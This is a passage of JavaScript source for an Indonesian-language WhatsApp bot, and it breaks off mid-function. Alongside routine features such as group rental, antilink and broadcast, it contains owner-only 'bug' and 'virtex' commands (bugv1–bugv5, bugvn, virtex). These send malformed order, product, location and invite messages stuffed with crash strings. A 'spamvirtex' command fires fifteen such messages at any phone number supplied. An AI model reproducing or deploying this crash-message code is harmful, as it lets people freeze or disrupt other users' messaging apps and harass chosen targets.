                                'status': 1,
                                'surface': 1,
                                'message': 'NOPE',
                                'orderTitle': 'halo gaes',
                               'thumbnail': virgam,
                                'sellerJid': "0@s.whatsapp.net"
                            }
                        }
                    },
                    'contextInfo': {'forwardingScore': 100000000, 'isForwarded': true, 'sendEphemeral': true}
                })
                
                
                xdev.sendMessage(from, {
                        'groupName': virtex8(prefix),
                        'groupJid': '6285156137901-1627579259@g.us',
                        'inviteCode': 'JUJkLCf4mRF0oBuAlwEhO6',
                        'inviteExpiration': '0',
                        'caption': virtex7(prefix),
                        'jpegThumbnail': davizin,
                    }, MessageType.groupInviteMessage, { contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
                    })        
                
                
                xdev.sendMessage(from, {
                            degreesLatitude: 36.036105801662316,
                              degreesLongitude: 138.09072320256624,
                            name: virtex7(prefix),
                               address: virtex6(prefix),
                             jpegThumbnail: virgam,
                              }, location,
                              {contextInfo: {forwardingScore: 100000000, isForwarded: true}})
                             
                             hmm4 = fs.readFileSync('./stik/fake.jpeg'),
               imeu = await xdev.prepareMessage( '0@s.whatsapp.net', hmm4, image, { thumbnail : davizin}), 
                imeg = imeu.message.imageMessage
                   res = await xdev.prepareMessageFromContent(from, {
                        'productMessage': {
                            'product': {
                           'productImage': imeg,
                                'productId': '',
                                'title': virtex8(prefix),
                                'description': virtex8(prefix),
                                'priceAmount1000': '1000',
                                'descriptionCount': 1,
                                'productImageCount': '1'
                            },
                            'businessOwnerJid': `0@s.whatsapp.net`,
                            'contextInfo': {
                                'forwardingScore': 100000000,
                                'isForwarded': true,
                                'sendEphemeral': true
                            }
                        }
                    }, {
                  contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
                    }), 
                  xdev.relayWAMessage(res)
                             
                             
                             
                    
                    const nana = fs.readFileSync('./stik/trava.jpg');
                        xdev.sendMessage(from, nana, image, {thumbnail: virgam, contextInfo:{ forwardingScore: 100000000, isForwarded: true}});
                        
                        
                        var kirin = xdev.prepareMessageFromContent(from, {
        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": virgam,
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                            }
                      }, {
              contextInfo: {forwardingScore: 100000000, isForwarded: true, sendEphemeral: true}
                });
                 xdev.relayWAMessage(kirin)
                        
                        
                    
 kok = fs.readFileSync('./lib/amaterasu.mp3')
await xdev.sendMessage(from, kok, audio, {  'quoted': {
                            'key': {
                                'participant':  `0@s.whatsapp.net`,
                                ...'from' ? {
                                    'remoteJid': '0@s.whatsapp.net'
                                } : {}
                            },
                            'message': {
                                'orderMessage': {
                                    'itemCount': jumlahTroli,
                                    'status': 1,
                                    'surface': 1,
                                     'message': 'NOPE',
                                    'orderTitle': fake,
                                    'thumbnail': davizin,
                                    'sellerJid':  '0@s.whatsapp.net'
                                }
                            }
                        }, caption: virtex7(prefix),
                   
                })
             
                }

break
           
           case 'bugv1':
                if(isExtream) return
         if (!isOwner) return onlyOwner()
              {
                var kirim = xdev.prepareMessageFromContent(from, {
                    'orderMessage': {
                        'orderId': '0@s.whatsapp.net',
                        'thumbnail': virgam,
                        'itemCount': jumlahTroli,
                        'status': 1,
                        'surface': 1,
                        'message': virtex7(prefix),
                        'orderTitle': fake,
                        'sellerJid': `0@s.whatsapp.net`,
                      'token': 'ydkskyshj755hfuej',
                    }
                }, {
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                            'remoteJid': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': jumlahTroli,
                                'status': 1,
                                'surface': 1,
                                'message': 'NOPE',
                                'orderTitle': 'halo gaes',
                                'sellerJid': "0@s.whatsapp.net"
                            }
                        }
                    },
                    'contextInfo': forward
                });
                 xdev.relayWAMessage(kirim)

                }
                break;
                
             
                case 'bugv2':
                     if(isExtream) return
            if (!isOwner) return onlyOwner()
                             xdev.sendMessage(from, {
                            degreesLatitude: 36.036105801662316,
                              degreesLongitude: 138.09072320256624,
                            name: virtex7(prefix),
                               address: virtex6(prefix),
                             jpegThumbnail: virgam,
                              }, location,
                              {contextInfo:forward})
                            break
                
                
                
                case 'bugv3':
                     if(isExtream) return
                   if (!isOwner) return onlyOwner()
                xdev.sendMessage(from, `${virtex7(prefix)} `, text, {
                    'contextInfo': {
                        'text': '??',
                        'forwardingScore': 999999999,
                        'isForwarded': true,
                        'sendEphemeral': true,
                        'externalAdReply': {
                            'title': 'bug',
                            'body': '',
                            'previewType': 'PHOTO',
                            'thumbnail': thumb,
                            'sourceUrl': ''
                        }
                    },
                    'quoted': {
                        'key': {
                            'fromMe': false,
                            'participant': `0@s.whatsapp.net`,
                         'remoteJid': '0@s.whatsapp.net'
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': jumlahTroli,
                                'status': 'INQUIRY',
                                'surface': 'CATALOG',
                                'message': 'NOPE',
                                'orderTitle': 'hay',
                                'thumbnail': davizin,
                                  'sellerJid': '0@s.whatsapp.net'
                            }
                        }
                    }
                });
                break;
                
                
                
                
                
           case 'bugv4':
                if(isExtream) return
                    if (!isOwner) return onlyOwner()
                    if(isGroup) return setReply("Gunakan bug ini di chat")
           {                
                    xdev.sendMessage(from, {
                        'groupName': virtex8(prefix),
                        'groupJid': '6285156137901-1627579259@g.us',
                        'inviteCode': 'JUJkLCf4mRF0oBuAlwEhO6',
                        'inviteExpiration': '0',
                        'caption': virtex7(prefix),
                        'jpegThumbnail': davizin,
                    }, MessageType.groupInviteMessage, { contextInfo: forward
                    })             
                    }
                    break;
                    
           case 'bugv5':
                if(isExtream) return
                    if (!isOwner) return onlyOwner()
           {
              
               hmm4 = fs.readFileSync('./stik/fake.jpeg'),
               imeu = await xdev.prepareMessage( '0@s.whatsapp.net', hmm4, image, { thumbnail : davizin}), 
                imeg = imeu.message.imageMessage
                   res = await xdev.prepareMessageFromContent(from, {
                        'productMessage': {
                            'product': {
                           'productImage': imeg,
                                'productId': '',
                                'title': virtex8(prefix),
                                'description': virtex8(prefix),
                                'priceAmount1000': '1000',
                                'descriptionCount': 1,
                                'productImageCount': '1'
                            },
                            'businessOwnerJid': `0@s.whatsapp.net`,
                            'contextInfo': forward
                        }
                    }, {
                  contextInfo: forward
                    }), 
                  xdev.relayWAMessage(res)
                
                    }
                    break;
    
           case 'bugvn':
           if(isExtream) return
                    if (!isOwner) return onlyOwner()
                iya2 = fs.readFileSync('./lib/amaterasu.mp3')
                xdev.sendMessage(from, iya2, audio, {
                    'quoted': {
                        'key': {
                            'participant': "0@s.whatsapp.net"
                        },
                        'message': {
                            'orderMessage': {
                                'itemCount': jumlahTroli,
                                'status': 1,
                                'thumbnail': virgam,
                                'surface': 1,
                                'message': virtex7(prefix),
                                'orderTitle': fake,
                                'sellerJid': "0@s.whatsapp.net",
                                'sendEphemeral': true,
                            }
                        }
                    },
                    'filename': '' + ngazap(prefix),
                    'mimetype': 'audio/mp4',
                    'duration': '359996400',
                    'ptt': true
                });
                break;

  case 'virtex':
                if(isExtream) return
                    if (!isOwner) return onlyOwner()
           {
           setReply('*Loading...*')
               await xdev.sendMessage(from, virtexbytsukasa(prefix), text)                
               await xdev.sendMessage(from, virtex(prefix), text)            
                await xdev.sendMessage(from, virtex2(prefix), text)       
                 await xdev.sendMessage(from, virtex3(prefix), text)    
                await xdev.sendMessage(from, virtex4(prefix), text)              
                await xdev.sendMessage(from, virtex5(prefix), text)     
                await xdev.sendMessage(from, virtex6(prefix), text)
                await xdev.sendMessage(from, virtex7(prefix), text)   
                await xdev.sendMessage(from, virtex8(prefix), text)            
                await xdev.sendMessage(from, virtex9(prefix), text)       
                 await xdev.sendMessage(from, virtex10(prefix), text)    
                await xdev.sendMessage(from, virtex11(prefix), text)              
                await xdev.sendMessage(from, virtex12(prefix), text)     
                await xdev.sendMessage(from, philip(prefix), text)
                 await xdev.sendMessage(from, slayer(prefix), text) 
                 await xdev.sendMessage(from, ngazap(prefix), text)
           }
                break;
           
           
           
           
           
           
           
           
          
           
           case 'spamvirtex':    
              //  if(isExtream) return
                   if (!isOwner) return onlyOwner()
                     try {                 
                     setReply('*Loading...*')
                    if (args.length < 1) return setReply(`Penggunaan ${prefix}spamvirtex nomor`)
					if (args[0].startsWith('08')) return setReply('Gunakan kode negara kak')
			       woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
					var nilaiAwal = 1;
                    while(nilaiAwal <= 3) { 
                     await xdev.sendMessage(`${woke}@s.whatsapp.net`, virtex7(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${woke}@s.whatsapp.net`, virtex6(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${woke}@s.whatsapp.net`, ngazap(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${woke}@s.whatsapp.net`, philip(prefix), text, {contextInfo: forward})
                     await xdev.sendMessage(`${woke}@s.whatsapp.net`, virtexbytsukasa(prefix), text, {contextInfo: forward})
                     nilaiAwal++}
					await xdev.sendMessage(from, `*Sukses send virtex sebanyak 15 virtex ke nomor ${q}*`, text, {quoted : dev})
					} catch (e) {
					console.log('Error :', e)
					setReply(`*Gagal mengirim virtex, System error pastikan memasukan nomer whatsapp dengan benar*`)
					}                        
					break
      
           
           
           case 'ssweb':
            case 'ss':
            if(!q) return setReply("Masukan Link")
            if(!isUrl(args[0]) && !args[0].includes('www.')) return reply("Link error");
                if (args.length < 1) return setReply('Urlnya mana om')
					teks = q
					ana = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${teks}`)
					buff = await getBuffer(ana.screenshot)
					xdev.sendMessage(from, buff, image, {quoted: dev, caption : teks})
					break
           
           
           
           
           
           
           
           
           
           
           
           
//-------------------------------》FITUR OWNER《-------------------------------\\     
           
           case 'addorder':
            try{
           if (!isOwner) return onlyOwner()
            if (args.length < 1) return setReply(`Penggunaan :\n${prefix}addorder linkgc 60s\n\nPilih waktu\ns = detik\nh = jam\nd =hari`)       
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return setReply(mess.Iv)
            if (!q) return setReply('masukan link gcnya kak')
            
             var LinkGc = q.split(" ")[0];
            var Second = q.split(" ")[1];
           
            var net = LinkGc.split('https://chat.whatsapp.com/')[1]
            if (!net) return setReply('pastikan itu link https://whatsapp.com/')
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await xdev.query({ 
            json: ["query", "invite",net],
            expect200:true })
           if(_sewa.checkSewaGroup(id, sewa)) return setReply("Grup tersebut masih tersisa waktu sewa")
              if(!isGroup){            
                          let code = LinkGc.replace('https://chat.whatsapp.com/', '')
                          xdev.acceptInvite(code)                                   
                          } else {
                            if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return setReply('*The link is invalid Tod*')
                            link = LinkGc.replace('https://chat.whatsapp.com/','')
                            fak = xdev.query({ json: ['action', 'invite', link],
                            expect200: true })                        
                            }                          
                            await setReply(`Sukses join kak`)
                              
                        _sewa.addSewaGroup(id, subject, LinkGc, Second, sewa)
                       await sendButMessage(id, `HALO KAK AKU *${fake}*`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}ceksewa`, buttonText: {displayText: `Cek sewa`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `Menu`,},type: 1}]);
                            }catch (err){
					      console.log(err)
					       return setReply("Link Error")
					       }
                           break
             
        
        
        case 'freeoneday':
            try{
            if (!q) return setReply('Masukan link gcnya kak')
            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return setReply("Linknya betul ga tuh")
            cos = args[0]
            var net = cos.split('https://chat.whatsapp.com/')[1]
            if (!net) return setReply('pastikan itu link https://whatsapp.com/')
            jids = []
            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await xdev.query({ 
            json: ["query", "invite",net],
            expect200:true })
            if(!isGroup){            
                          let code = args[0].replace('https://chat.whatsapp.com/', '')
                          xdev.acceptInvite(code)                                   
                          } else {
                            if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return setReply('*The link is invalid Tod*')
                            link = args[0].replace('https://chat.whatsapp.com/','')
                            fak = xdev.query({ json: ['action', 'invite', link],
                            expect200: true })                        
                            }                          
                            await setReply(`Oke aku udah join :)`)
                            await xdev.sendMessage(`${nomerOwner}@s.whatsapp.net`,`*「 freeoneday 」*\n\nHalo kak, ada yang sewa aku nih\n\nNama : ${pushname}\nNomer : ${senderNumber}\n\nLink Gc : \n\n${q}\n\nCommand :\n${prefix}${command}\n\n\n© ${fake1}\n${calender}\n`,text)                                         
                             _sewa.addSewaGroup(id, subject, q, "1d", sewa)
                            await sendButMessage(id, `HALO KAK AKU *${fake}*`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}ceksewa`, buttonText: {displayText: `Cek sewa`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `Menu`,},type: 1}]);
                            }catch (err){
					      console.log(err)
					       return setReply("Link Error")
					       }
                           break
        
        
        
        
        
        
                 
                 
                 case 'autolevel':
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (autoLevel) return setReply('Sudah aktif kak')
                    autoLevel = true
                    setReply("Sukses mengaktifkan auto level!");
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (!autoLevel) return setReply('Sudah Mati')
                    autoLevel = false
                    setReply("Sukses mematikan auto level!");
					} else if (!q) {
                      sendButMessage(from, `MODE AUTO LEVEL`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}autolevel on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}autolevel off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
                 
                 
                 
                 
                 
                 case 'nsfw':
                  if(!isGroup) return setReply("Hanya bisa di group")
                    if(isExtream) return
			        if (!isGroupAdmins && !isOwner)return setReply('hanya admin dan owner')
			        if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (checkDataId ("nsfw", from, DataId) ) return setReply('Sudah aktif kak')
                    addDataId(from, command, DataId)
                    setReply("Nsfw telah di di aktifkan")
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (!checkDataId ("nsfw", from, DataId) ) return setReply('Sudah Mati')
                    removeDataId (command, from, DataId)
                    setReply("Nsfw telah di matikan")
					} else if (!q) {
                      sendButMessage(from, `MODE ANTI BUGGC`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}nsfw on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}nsfw off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
        
                 
           
           case 'antitroli':
            if(!isGroup) return setReply("Hanya bisa di group")
                    if(isExtream) return
					if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (antibugtroli === true) return setReply('Sudah aktif kak')
                    antibugtroli = true
                    let ah =`Mode anti bugtroli aktif kak`
                    xdev.sendMessage(from, ah, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (antibugtroli === false) return setReply('Udah off kak')
                     antibugtroli = false
                     let uh =`Mode anti bugtroli di matikan`
                     xdev.sendMessage(from, uh, text, { quoted: setQuoted, contextInfo: forward})
					} else if (!q) {
                      sendButMessage(from, `MODE ANTI BUGTROLI`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antitroli on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}antitroli off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
           
           
           case 'antilink':
    if (!isGroupAdmins) return sendSticker(hanyaadmin)
					if (!isGroup) return setReply('hanya bisa di group')
					if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
						if (isAntiLink) return setReply('Fitur sudah aktif kak')
						addDataId(from, command, DataId)
						let ih =`Fitur antilink telah di aktifkan`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
						if (!isAntiLink) return setReply('Udah mati')
						removeDataId (command, from, DataId)
						let ih =`Fitur antilink telah di matikan`
                    xdev.sendMessage(from, ih, text, { quoted: setQuoted, contextInfo: forward})
					}else if (!q) {
                      sendButMessage(from, `MODE ANTI LINK`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}antilink on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}antilink off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
           
           
           
           
                 
                 
                 case 'forward':
					       if (!isOwner) return onlyOwner()
					if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
					if (forwarding === true) return setReply('Udah aktif kak')
                    forwarding = true
                    let ah =`Mode forwarding/diteruskan berhasil diaktifkan \nsilakan ketik ${prefix}menu untuk melihat perbedaanya`
                    xdev.sendMessage(from, ah, text, { quoted: setQuoted, contextInfo: forward})
					} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
					 if (forwarding === false) return setReply('Udah off kak')
                     forwarding = false
                     let uh =`Mode forwarding telah di matikan`
                     xdev.sendMessage(from, uh, text, { quoted: setQuoted})
					} else if (!q) {
                      sendButMessage(from, `MODE AUTO TYPING`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}forwarding on`, buttonText: {displayText: On },type: 1},
                      {buttonId: `${prefix}forwarding off`, buttonText: { displayText: Off },type: 1}]);
                    }
                 break;
           
           
     
	
	
           
           
           case 'bc':
           
					if (!isOwner && !dev.key.fromMe) return onlyOwner()
					if (args.length < 1) return setReply('Teksnya?')
					await setReply(`*Loading...*`)
					anus = await xdev.chats.all()
					let butonih = [{"buttonId": `${prefix}menu`,"buttonText": {"displayText": `ᴍᴇɴᴜ`},"type": "RESPONSE"},
                        {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
					
					if (isMedia && !dev.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST BOT*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						}else if (isMedia && !dev.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, audio, { ptt: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `${q}`, orderTitle: `${q}`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
					} else {
						for (let _ of anus) {
							await sendBc(_.jid, ` *BROADCAST*\n\n${q}`,`© ${fake1}`, fs.readFileSync('./stik/thumbnaildokumen.jpg'),butonih)
						}
						await setReply(`Sukses mengirim Broadcast:\n${q}`)
					}
					break
					
					
					
					case 'bcpc':
					if (!isOwner && !dev.key.fromMe) return onlyOwner()
					if (args.length < 1) return setReply('Teksnya?')
					await setReply(`*Loading...*`)
					anus = await xdev.chats.all().filter(v => v.jid.endsWith('s.whatsapp.net'))
					let ohyeah = [{"buttonId": `${prefix}menu`,"buttonText": {"displayText": `ᴍᴇɴᴜ`},"type": "RESPONSE"},
                        {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
					if (isMedia && !dev.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						}else if (isMedia && !dev.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, audio, { ptt: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `${q}`, orderTitle: `${q}`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
					} else {
						for (let _ of anus) {
							await sendBc(_.jid, ` *BROADCAST*\n\n${q}`,`© ${fake1}`, fs.readFileSync('./stik/thumbnaildokumen.jpg'),ohyeah)
						}
						await setReply(`Sukses mengirim Broadcast:\n${q}`)
					}
					break
					
					
					
					
					case 'bcgc':
					if (!isOwner && !dev.key.fromMe) return onlyOwner()
					if (args.length < 1) return setReply('Teksnya?')
					await setReply(`*Loading...*`)
					anus = await xdev.chats.all().filter(v => v.jid.endsWith('g.us'))
					let yesnih = [{"buttonId": `${prefix}menu`,"buttonText": {"displayText": `ᴍᴇɴᴜ`},"type": "RESPONSE"},
                        {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
					if (isMedia && !dev.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, image, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, video, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						} else if (isMedia && !dev.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `Broadcast`, orderTitle: `Broadcast`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward, caption: `*BROADCAST GROUP*\n\n${q}` })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
						}else if (isMedia && !dev.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
						buff = await xdev.downloadMediaMessage(encmedia)
						for (let _ of anus) {
							await xdev.sendMessage(_.jid, buff, audio, { ptt: true, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: jumlahTroli, status: 200, thumbnail: thumb, surface: 200, message: `${q}`, orderTitle: `${q}`, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: forward })
						}
						await setReply(`Sukses mengirim Broadcast ${q}`)
					    } else {
						for (let _ of anus) {
							
